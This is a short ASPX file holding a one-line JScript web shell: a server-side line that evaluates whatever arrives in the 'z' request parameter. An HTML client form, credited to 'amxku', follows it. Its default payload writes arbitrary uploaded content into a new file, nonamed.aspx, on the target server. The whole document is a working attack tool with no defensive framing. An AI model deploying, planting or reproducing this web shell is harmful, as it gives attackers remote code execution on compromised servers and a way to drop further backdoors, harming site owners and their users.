<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["z"],"unsafe"));%>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<TITLE> ASPX one line Code Client by amxku</TITLE>
</HEAD>
<BODY>
<form action=/aspx/6173e106b929b82f8f23ee0714bf77e6.aspx method=post>
<textarea name=z cols=120 rows=10 width=45>
var nonamed=new System.IO.StreamWriter(Server.MapPath("nonamed.aspx"),false);
nonamed.Write(Request.Item["l"]);
nonamed.Close();
</textarea>
<textarea name=l cols=120 rows=10 width=45>your code</textarea><BR><center><br>
<input type=submit value=提交>
</BODY>
</HTML>
